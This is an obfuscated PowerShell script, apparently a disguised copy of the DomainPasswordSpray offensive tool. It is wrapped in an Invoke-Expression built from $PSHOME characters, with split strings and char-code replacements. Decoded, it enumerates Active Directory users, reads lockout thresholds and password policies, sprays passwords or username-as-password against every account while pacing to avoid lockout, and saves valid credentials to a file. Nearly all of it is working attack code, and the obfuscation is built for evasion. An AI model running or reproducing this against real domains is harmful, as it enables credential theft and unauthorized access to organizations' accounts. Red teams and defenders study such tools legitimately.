 .( $pshoMe[21]+$psHOME[34]+'x') ( (('function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack again'+'st users of a domain. By default it wi'+'ll automatically generate the userlist from the domain. Be caref'+'ul not to lockout any accounts.

    DomainP'+'as'+'swordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Bria'+'n Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Req'+'uired Dependencies: None
    Optional Dependenci'+'es: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userl'+'ist from the domain. Be careful no'+'t to lockout any accounts.

    .PARAMETER '+'UserList

    Optional UserList parameter. This will be generated autom'+'atically if not specified'+'.

    .PARAMETER Passw'+'ord

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very c'+'areful'+' not to lockou'+'t accounts).

    .PARAMETER OutFile

    A file to output the results to.

'+'
    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER Filter'+'

    Custom LDAP filter for users, e.g. lX724(description=*admin*)lX72'+'4

    .PARAMETER Force

    Fo'+'rces the '+'spray to continue'+' and doesnmnSYtt prompt for confirmation.

    .PARAMETER Fudge

    Extra wait time between each round of tests (seconds).

    .P'+'ARAMETER Quiet

  '+'  Less output so it will work better with things like Cobalt Strike

    .PA'+'RAMETER Use'+'rnameAsPassword

    For each user, will try t'+'hat usermnSYts name as their password

    .EXAMPLE

    C:WyfxFPS> Invoke-DomainPasswordSpray -Password Winter2016

    Description
    '+'-----------
    This comm'+'and will automatically generate a list of users from the current usermnSYts domain and attempt to authenticate using each username a'+'nd a password of Winter2016.

    .EXAMPLE

    C:WyfxFPS> '+'Invoke-DomainPasswordSpray -User'+'List users.txt -Domain d'+'omain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain lX724domain-namelX724 using eac'+'h password in the passlist.txt '+'file'+' one at a time. It will automatically attempt to detect the domainmnSYts lockout observation window and restrict sprays to 1 attempt during each window.

'+'    .EXA'+'MPLE'+'
'+'

  '+'  C:WyfxFPS> Invoke-DomainPasswordSpray -User'+'nameAsPassword -OutFile valid-creds.txt

    Description
    -----------
    This command will automatically generate a list of users from the curre'+'nt usermnSYts domain and a'+'ttempt to authenticate'+' as each user by using '+'their username as their password. Any valid credentials will b'+'e '+'saved to valid'+'-creds.tx'+'t

    #>
    param(
     [Parameter(Position = 0, Mandatory = mMuH2false)]
     [string]
     mMuH2UserList = lX724lX724,

     [Para'+'meter(Position = 1, Mandatory = mMuH2false)]
     '+'[string]
     mMuH2Password,

     [Parame'+'ter(Position ='+' 2, Mandatory = mMuH2false)'+']
     [string]
     mMuH2PasswordList,

     [Parameter(Position = 3, Mand'+'atory = mMuH2f'+'alse)]
     [string]
     mMuH2OutFile,

     [Parameter(Position = 4, Mandatory ='+' mMuH2false)]
 '+'    [string]
     mMuH2Filter = lX724lX724,

     '+'[Par'+'amet'+'er(Position = 5, Mandatory = mMuH2false)]
     [st'+'ring]
     mMuH2'+'Domain ='+' lX724lX724,

     [Parameter(Position = 6, Mandatory = mMuH2false)]
 '+'    [switch]
     mMuH2Force,

     [Parameter(Position = 7'+', Mandatory = m'+'MuH'+'2fal'+'se)]
     [switch]
     mMuH2Userna'+'meAsPassword,

     [Parameter(P'+'osition = 8,'+' Mandatory = mMuH2false)]
     [int'+']
     mMuH2Delay=0,

     [Para'+'meter(Position = '+'9, Mandatory = mMuH2false)'+']
     m'+'MuH2Jitter=0,

     [Parameter(Position = 10, Mandatory = mMuH2f'+'alse)]
     ['+'switch]
     mMuH2Quiet,

'+'
     [Parameter(Position = 11, Mand'+'atory = mMuH2false)]
     [int]
     mMuH2Fudge=10
    )

    if (mMuH2Passw'+'ord)
    {
'+'        mMuH2Pas'+'swords = @(mMuH2P'+'assword'+')
    }
    elseif(mMuH2Us'+'ernameAsPassword)
    {
        '+'mMuH2Passwords = lX724lX724
    }
    elseif(mMuH2PasswordList)
    {
        mMuH2Passwords = Get-Content m'+'MuH2Password'+'List
    }
    else
    {
        Write-Host -ForegroundColor Red lX724The -Password or -PasswordList option must be specifiedlX724
        break
    }

    try'+'
   '+' {
        if (mMuH2Domain -ne lX'+'724lX724)
        {
            # Using domain specified with -Domain option
            mMuH2DomainContext = New-Obje'+'ct Sys'+'tem.DirectoryServices.ActiveDirectory.Di'+'rectoryContext(lX724'+'domainlX724,mMuH2Domain)
           '+' mMuH2DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::G'+'etDomai'+'n'+'(mMuH2DomainContext)
            mMuH2CurrentDomain = lX724LDAP://lX724 + ([ADSI]lX724LDAP:'+'//mMuH'+'2DomainlX724).'+'distinguishedName
        }
        else
        {
      '+'      # Trying to use the current usermnSYts domain
            mMuH2Domain'+'Object = [System.DirectoryS'+'ervices.Active'+'Directory.Domain]::GetCurrentDomain()
            mMuH2CurrentDomain = lX724LDAP://lX724 + ([ADSI]lX724lX724'+').distingu'+'ishedName
        }
    }
    catch
    {
        W'+'rite-Host -ForegroundColor l'+'X724redlX724 lX724[*] C'+'ou'+'ld not connect to the domain. Try specifying the domain nam'+'e with the -Domain option.lX724
        break
    }

    if (mMuH2UserList -eq lX72'+'4lX724'+')
    {
        mMuH2UserListAr'+'ray = Get-DomainUserList -Domain mMuH2Doma'+'in -RemoveDisabled -RemovePotentialLoc'+'kouts -Filter mMuH2Filter
    }
 '+'   else
    {
     '+'   # if a Userlist is specified use i'+'t and do not check for lockout thresholds
        Write-Host lX72'+'4[*] Using mMuH2UserList '+'as userlist to spray withlX724
     '+'   Write-Host -ForegroundColor lX724yello'+'wlX724 lX72'+'4[*] Warning: Users will not be checked for lockout '+'thre'+'shold.lX724
     '+'   mMuH2UserListArray = @()
        try
'+'
        {
            mMuH2UserListArray = Get'+'-Content mMuH2Us'+'erList -ErrorAc'+'tion stop
        }
        catch [Exception]
   '+'    '+' {
            Write-Ho'+'st -ForegroundColor lX724redlX724 lX724mMuH2_.ExceptionlX724
            break
        }

    }


  '+'  if (mM'+'uH2Passwords.count -gt 1)
    {
    '+'    Write-Host -ForegroundColor Yellow '+'lX724[*] WARNIN'+'G - Be very careful no'+'t to'+' lock o'+'ut accounts with'+' the password list option!lX724
    }

    mMuH2observation_win'+'dow = Get-ObservationWindow mMuH2CurrentDomain

    Write-Host -ForegroundColor Yellow lX724[*] '+'The domain password policy observation win'+'dow is set to mMuH2observation_window minutes.lX724
    Write-Host lX724[*] Setting a mMuH2observation_window minute wait in between sprays.lX724

    # if no force flag is set we will ask if the user is sure they want to spray
    if (!mMuH2Force)
 '+'   {
        mMuH2title = lX724Confirm Password '+'SpraylX724
'+'        mMuH2message = lX724Are you sure you want to perform a password spray against lX724'+' + mMuH2UserListArray.count + '+'lX724 accoun'+'ts?lX724

        mMuH2yes = Ne'+'w-Object System.Management.Automation.Host.ChoiceDescri'+'ption l'+'X724&YeslX724, '+'sLX6
            lX72'+'4Attempts to authenticate 1 '+'time per user in the list for each password in the passwordlist file.lX724

        '+'mMuH2no = New-Object System.Man'+'agement.Automation.Host.ChoiceDescription'+' lX724&NolX7'+'24, sLX6
            lX724Cancels the password sp'+'ray.'+'lX724

        mMuH2options '+'= [System.Management.Automation.Host.ChoiceDescription[]](mMuH2yes, mMuH2no)

        mMuH2result = mMuH2host.ui.PromptForChoice(mMuH2title, mMuH2message, mMuH2opt'+'ions, 0)

        if (mMuH2resu'+'lt -ne 0)
      '+'  {
            Write-Host lX724Cancelling the password spray.lX724
            break
'+'        }
    }
    Write-Host -F'+'oregroundColor Yellow lX724[*] Password spraying has begun with lX724 mMuH2Passwords.count lX72'+'4 passwordslX724
    Write-Host lX724[*] This might take a while depending on the total number of userslX724

    if(mM'+'uH2UsernameAsPassword)
    {
        Invoke-Spray'+'SinglePassword -Domain mMuH2CurrentDomain -UserListArray mMuH'+'2UserListArray -OutFile mMu'+'H2OutFile -Delay mMuH2Delay -Jitter mMuH2Jitter -UsernameAsPassword'+' -Quiet mMuH2Quiet
    }
    e'+'lse
    {
        for(mMuH2i = 0; mMuH2i -lt mMuH2Passwords.co'+'unt; mMuH2i++)
   '+'     {
     '+'       Invoke-SpraySinglePassword -Domain mMuH2CurrentDomain -UserListArray mMuH2UserListArray -Passw'+'ord mMu'+'H2Passwords[mMuH2i] -OutFile mMuH2OutFile -Delay mMuH2Delay -Jitter mMuH2Jitter -Quiet mMuH2Quiet
            if ((mMuH2i+1) -lt mMuH2Passwords.count)
        '+'    {
                Countdo'+'wn-Timer -Seconds (60*mMuH2observation_wi'+'ndow + mMuH2Fudge) -Quiet mMuH2Quiet
            }
        }
    }

    Write-Host -ForegroundColor Yellow lX724[*] Password spraying is completelX724
'+'
    if (mMuH2OutFile '+'-ne lX724lX724)
    {
        Write-Host -ForegroundColor Yellow lX724[*] Any passwords that wer'+'e succe'+'ssfully sprayed have been output to mMuH2OutFilelX724
    }
}

function C'+'ountdown-Timer
{
    param(
        m'+'MuH2Seconds = 1800,
        mMuH2Message ='+' lX724[*] Pausin'+'g to avoid account lockout.lX724,
        [switch] mMuH2Q'+'uiet '+'= mMuH2False
    )
    if (mMuH2quiet)
    {
    '+'    Write-Host lX724mMuH2Mes'+'sage Waiting for mMuH2(mMuH2Seconds/60) minutes. mMuH2(mMuH2Seconds - '+'mMuH2Count)lX724
        Start-Sleep -Seconds mMuH2Seconds
    } else {
        foreach (mMuH2Count in (1..mMuH2Seconds))
        {
            Write-Progress -Id 1 -Acti'+'vity mMuH2Message -Status '+'lX72'+'4Waiting for m'+'MuH2(mMuH2Seconds/60) minutes. mMuH2(mMuH2Seconds - mMuH'+'2Count) seconds remaininglX72'+'4 -PercentComplete'+' ((mM'+'uH2Count / mMuH2Seconds) * 100)
            Start-Sleep '+'-Seconds 1
        }
        Write-Progress -Id 1 -Activit'+'y mMuH2Mes'+'sage -'+'Status lX724CompletedlX724 -PercentComple'+'te 100 -Compl'+'eted
    }
}

function Get-DomainUserList
{
<#
    .SYNOPSIS

    This m'+'odule gathers a userlist from the domain.

    DomainPasswordSpray Function: Get-DomainUserList
    Au'+'thor: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None'+'
    Optional Dependencies: None

    .DESCRIPTION

    This module '+'gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

 '+'   Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven'+' (@sallyvdv))

    .PARAMET'+'ER RemovePotentialLockouts

    Removes accounts within 1 attempt of locking out.

    .PARAMETER Filter

    Custom L'+'DAP filter for user'+'s, e.g. lX724(d'+'escription=*admin*)lX724

    .EXAMPLE

    PS C:WyfxF> Get-DomainUserList

'+'
    Description
    -----------
    This command will gather a userlist from the domain inclu'+'ding all samAccountType lX724805306368'+'l'+'X724.

    .EXAMPLE

    C:WyfxFPS> Get-DomainUserList -Domai'+'n domainname -RemoveD'+'isabled -RemovePotentialLockouts '+'w0vzg Out-File -Encoding ascii userlist.txt

    Description
 '+'   ----------'+'-
    This command will gather a userlist from the domain lX724domainnamelX724 inc'+'luding any account'+'s that are not disabled and are not close to locking out. It will wri'+'te them to a file at lX724userlist.txtlX724

    #>
    param('+'
     [Parame'+'ter(Position = 0, Mandatory = mMuH2false)]
     [string]
  '+'  '+' mMuH2Domain = lX724lX724,

     [Parameter(Position = 1, Mandatory = mMuH2false)]
     [switch]
     mMuH2RemoveDis'+'abled,

     [Paramete'+'r(Position = 2, Mandatory = mMuH2false)]
     [switch]
     mMuH2RemovePotentialLockou'+'ts,

     [Parameter(Position = 3, Mandatory = mMuH2false)]
     [string]
     mMuH2'+'Filter
 '+'   )

    try
    {
 '+'       if (mMuH2Domain -ne lX724lX724)
      '+'  {
            # Using domain specified with -Domain option
         '+'   mMuH2Domain'+'Context = New-Ob'+'ject System.DirectoryServices.ActiveDirec'+'tory.DirectoryContext(lX724domainlX724,mMuH2Domain)
            mMuH2DomainObject =[System.DirectoryServices.Activ'+'eDirectory.Domain]::GetDomain(mMuH2DomainContext)
            mMuH2CurrentDomain = l'+'X724L'+'DAP://lX724 + ('+'[ADSI]'+'lX724LDAP://mMuH2DomainlX7'+'24).distinguishedName
  '+'      }
        else
        {
            # Trying to use the current usermnSYts domain
      '+'      mMuH2DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
     '+'       mM'+'uH2CurrentDomain = lX724LDAP://lX724 + ([ADSI]lX724lX724).distinguishedName
        }
    }
    catch
    {
  '+'      Write-Host -Foreg'+'roundColor lX724redlX724 lX724[*] Could connect to the domain. Try specifying the domain name with the -Domain option.lX724
        break
    }

    # Setti'+'ng the current domainmnSYts account lockout threshold
    mMuH2objDeDomain = [ADSI] lX724LDAP://mMuH2(mMuH2DomainObject.PDCRoleOwner)lX724
    mMuH2Accou'+'ntLockoutThresholds = @()
    mMuH2AccountLocko'+'utThresholds += mMuH2objDeDomain.Properties.lock'+'outthreshold

    # Getting the AD behavior version to determine if fine-grained password policie'+'s are possible
    mMuH2behaviorversion = [int] mMuH2objDeDomain.Properties[mnSYtmsds-behavior-versionmnSYt].item(0)
    if (mMuH2behaviorversion -ge 3)
    {
        # Determine '+'if there are any fine-gr'+'ained password policies'+'
        Write-'+'Host lX724[*] Current doma'+'in is compatible with Fine-Grained Password '+'Policy.lX724
        mMuH2ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
        mMuH2ADSearc'+'h'+'er.SearchRoot = mMuH2objDe'+'Domain
        mMuH2ADSearcher.Filter = lX724(objectclass=msDS-PasswordSettings)lX724
        mMuH2PSOs = mMuH2ADSearcher.FindAll()'+'

        if ( mMu'+'H2PSOs.count'+' -gt 0)
        {
 '+'           Write-Host -foregroundcolor lX7'+'24yellowlX724 (lX724[*] A total of lX724 + mMuH2PSOs.count + lX724 Fine'+'-Grained Password policies were found.sLX6rsLX6nlX724)
            foreach(mMuH2ent'+'ry in mMu'+'H2PSOs)
            {
 '+'     '+'          # Se'+'lecting the lockout threshold, min pwd length, and which
                # groups the fine-grained password policy applies '+'to
   '+'             mMuH2PSOFineGrainedPolicy = mMuH2entry w0vzg'+' Select-Object -ExpandProperty Properties
                mMuH2PSOP'+'olicyName = mMuH2PSOFin'+'eGrainedPolicy.name
                mMuH2PSOLockoutThreshold = mMuH2PSOFineGrainedPolicy'+'.mnSYtmsds-locko'+'utthre'+'sholdmnSYt
                mMuH2PSOAppliesT'+'o = mMuH2PSOFineGrainedPolicy.mnSYtmsds-psoappliestomnSYt
                mMuH2PSOMinPwdLength = mM'+'uH2PSOFineGrai'+'nedPol'+'icy.mnSYtmsds-'+'minimu'+'mpasswordlengthmnSYt
   '+'             # adding lockout threshol'+'d to array for use later to determine which is the lowest.
                '+'mMuH2AccountLockoutThresholds += mMuH2PSOLockoutThreshold

       '+'         Wri'+'te-Host lX724[*] Fine-Grained Password Policy titled: mMuH2PSOPolicyName has a Lockout Threshold of mMuH2PSOLockoutThreshold attempts, minimum password length of mMuH2PSOMinPwdLength cha'+'rs, and applies to mMuH2PSOAppliesTo.sLX6rsLX6nlX724
            }
        }
    }

'+'
    mMuH2o'+'bs'+'ervation_window = Get-ObservationWindow mMuH2CurrentDomain

    # Generate a userlist from the domain
    # Se'+'lecting the lowe'+'st ac'+'count lockout threshold in the dom'+'ain to avoid
    # lock'+'ing out any accounts.'+'
    [i'+'nt]mMuH2SmallestLock'+'outThreshold = mMuH2'+'AccountLockoutThresholds w0v'+'zg sort w0'+'vzg Select -First 1
    Write-Host -ForegroundColor lX724yellowlX724 lX724[*] Now creating a list of users to spray...lX724

 '+'   if (mMuH2SmallestLockoutThreshold -eq lX7240lX724)
    {
        Write-Host -Fore'+'groundColor lX724YellowlX724 lX724[*] There appears to be no lockou'+'t policy.lX724
    }
    else
'+'    {
 '+'       Write-Host -ForegroundColor lX724YellowlX724 lX724[*] The smallest l'+'ockout threshold discovered in'+' the domain is mMuH2SmallestLockoutTh'+'reshold login attempts.lX724
    }

    mMuH2UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]mMuH2CurrentDomain)
    mMuH2DirEntry = New-Object System.DirectoryServices.DirectoryEntry
    mMuH2UserSearcher.SearchRoot = mMuH2DirEntry

    mMuH2UserSearcher.Prop'+'ertiesToLoad.Add(lX724samaccountnamelX724) > mMuH2Null
    mMuH2UserSearcher.PropertiesToLoad.Add(lX724badpwdcountlX724) > mMuH2Null
    mMuH2UserSearcher.PropertiesToLoad.Add(lX724badpasswordtimelX724) > mMuH2Null

    if (mMuH2Remove'+'Disabled)
    {
        Write-Host -Fore'+'groundColor lX724yellowlX724 lX72'+'4[*] Removi'+'ng disabled users from list.lX724
        # More precise LDAP filter UAC c'+'heck '+'for use'+'rs that are disabled'+' '+'(Joff Thyer)
        # LDAP '+'1.2.840.113556.1.4.803 means bitwise &
        # uac 0x2 is ACCOUNTDISABLE
        # uac 0x10 '+'is LO'+'CKOUT
    '+'    # See http://jackstromberg.com/2013/01/use'+'raccountcontrol-attribute'+'flag-values/
        mMuH2UserSearche'+'r.filter =
     '+'       lX724(&(objectCat'+'egory='+'person)(objectClass=user)(!userAccountControl:1.2.840.11'+'3556.1.'+'4.803:=16)(!userAccou'+'ntControl:1.2.840.113556.'+'1.4.803:=2)mMuH2Filter)lX724
    }
    else
    {
        mMuH2UserSearcher.f'+'ilter = lX724(&(objectCategory=person)('+'objectClass=user)mMuH2Filter)lX724
   '+' }

    mMuH2UserSearcher.Proper'+'tiesToLoad.add(lX724samaccountnamelX724) > mMuH2'+'Null
    mMuH2UserSearcher.PropertiesToLoad.add(lX724lockouttimelX724) > mMuH2'+'Null
    mMuH2UserSearcher.PropertiesToLoad.add(lX724badpwdcountlX724) > mMuH2Null
    mMuH2UserSearcher.PropertiesToLoad.add(lX724badpasswordtimelX724) > mMuH2Null

    #Wri'+'te-Host mMuH2UserSearcher.filter

'+'    # grab batch'+'es of 1000 in results
    mMuH2User'+'Searcher.P'+'ageSize ='+' 1000
    mMuH2AllUserObjects = mMuH2UserSearcher.FindAll()
    Write-Host -ForegroundColor lX724yellowlX724 (lX724[*] There are lX724 '+'+ mMuH2AllUserObjects.count + lX724'+' total users found.lX724)
    mMuH2UserListArray = @()

'+'    if (mMuH2RemovePotentialLockouts)
    {
        Write-Host -ForegroundColor lX724yellowlX724 lX724[*] Removing users within 1 attem'+'pt '+'of locking out from list.lX724
        foreach (mMuH2user in mMu'+'H2AllUserObjects)
        {
            # Getting bad password counts and lst ba'+'d'+' password time for each user
            mMuH2badcount = mMuH2u'+'ser.Properties.b'+'adpwdcount
            mMuH2s'+'amaccountname = mMuH2user.'+'Properties.samaccountname
       '+'     t'+'ry
            {
                mMuH2badpasswordtime = mMuH2user.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            mMuH2currenttime = Get-Dat'+'e
            mMuH2lastbadpwd = [DateTime]::FromFileTime(mMuH2badpasswo'+'rdtime)
            mMuH2timedifference = (mMuH2currenttime - mMuH'+'2lastbadpwd).TotalMinutes

            if (mMuH2badcount)
            {
                [int]mMuH2userbadcount = [convert]::ToInt32(mMuH2b'+'adcount, 10'+')
                mMuH2attempts'+'untillockout = mMuH2Smallest'+'LockoutThresho'+'ld - mMuH2userbadcount
                # if there is more t'+'han 1 attempt '+'left before a user locks out
           '+'     # or if the time since the last fail'+'ed login is great'+'er than the domain
                # obs'+'ervation window add user to spray list
                if ((mMuH2timed'+'ifference -gt mMuH2observatio'+'n_window) -or (mMuH2attemptsuntillockout -gt 1))
                           '+'     {
  '+'       '+'           mMuH2UserListArray += mMuH2samaccountname
                }
            }
        }
    }
    else
    {
        foreach (mMuH2user in mMuH2AllUserObjects)
        {
            mMuH2samaccountname'+' = mMuH2user.Properties.samaccountname
            mMuH2UserListAr'+'ray += mMuH2samaccountname
        }
    }

    Write-Host -foregroundcolor lX724yellowlX724 (lX724[*] Created a userlist co'+'ntaining lX724 + mM'+'uH2UserListArray.count + lX7'+'24 users gathered from the current usermnSYts domainlX724)
    return mMuH2UserListArray
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
        '+' '+'   mMuH2Domain,
            [Paramete'+'r(Position=2)]
            [string[]]
            mMuH2UserListArray,
         '+'   [Parameter(Position=3)]
            [string]'+'
            mMuH2Password,
     '+'       [Parameter(Position=4)]
            [string]
            mMuH2OutFile,
            [Parameter(Position=5)]
            [int]
            mMuH2Delay=0,
            [Parameter(Position=6)]
            [double]
    '+'        mMuH2Jitter=0,
            [Parameter(P'+'osition=7)]
            [sw'+'itch]
            mMuH2UsernameAsPassword,
            [Parameter(Position=7)]
            [switch]
            mMuH2Quiet
    )
    mMuH2time = Get-Date
    mMuH2count = mMuH2UserListArray.count
    Write-Host lX724[*] Now trying password mMuH2Passwor'+'d again'+'st mM'+'uH2count users. Current time is mMuH2(mMuH2time.'+'ToShortTimeString())lX724
    mMuH2curr_user = 0
    if (mMuH2OutFile -ne lX724lX724-and -not mMuH2Quiet)
    {
        Write-Host -ForegroundColo'+'r Yellow lX724[*] Writing successes to mMuH2OutFilelX724    
    }
    mMuH2RandNo = New-Object System.R'+'andom

 '+'   foreach (mMuH2User in mMuH2UserListArray)
    {
        if '+'(mMuH2UsernameAsPassword)
        {
            mMuH2Password = mMuH2User
        }
        mMuH2Domain_check = New-Object System.DirectoryServices.Dire'+'ctoryE'+'ntry(mMuH2Domain,mMuH2User,mMuH2Password)
        if (mMuH2Domain_check.name -ne mMuH2null)
        {
           '+' if (mMuH2OutFile -ne lX724lX724)
            {
                Add-Con'+'ten'+'t mM'+'uH2OutFile mMuH2UsersLX6:mMuH2Password
            }
       '+'     Write-Host -ForegroundColor Green lX724[*] SUCCESS! User:mMuH2User Password:mMuH2PasswordlX724
        }
        mMuH2curr_user '+'+= 1
        if (-not mMuH2Quiet)
        {
            Write-Host -nonewline lX724mMuH2curr_user of mMuH2count users te'+'stedsLX6rlX724
        }
        if (mMuH2Delay)
'+'        {
            Start-Sleep -Seconds mMuH2RandNo.Next((1-mMuH2Jitter)*mMuH2D'+'elay, '+'(1+mMuH2Jitter)*mMuH2Delay)
        }
    }

}
'+'

function Get-ObservationWindow(mMuH2DomainEntry)
{
    # Get account lockout observation window to avoid running more than 1
    # password spr'+'ay pe'+'r observation window.
'+'
    mMuH2lockObservatio'+'nWindow'+'_attr = mMuH2DomainEntry.Properties'+'[mnSYt'+'lockoutObservationWindowmnSYt]
    mMuH2observation_win'+'dow = mMuH2DomainEntry.ConvertLargeIntegerToInt64(mMuH2lockObservationWindow_attr.Value) / -600000000
    return mMuH2observation_window
}')  -ReplacE([cHaR]87+[cHaR]121+[cHaR]102+[cHaR]120+[cHaR]70),[cHaR]92 -ReplacE ([cHaR]109+[cHaR]77+[cHaR]117+[cHaR]72+[cHaR]50),[cHaR]36  -ReplacE([cHaR]119+[cHaR]48+[cHaR]118+[cHaR]122+[cHaR]103),[cHaR]124-ReplacE([cHaR]109+[cHaR]110+[cHaR]83+[cHaR]89+[cHaR]116),[cHaR]39  -CREplaCe  'lX724',[cHaR]34-ReplacE([cHaR]115+[cHaR]76+[cHaR]88+[cHaR]54),[cHaR]96) )
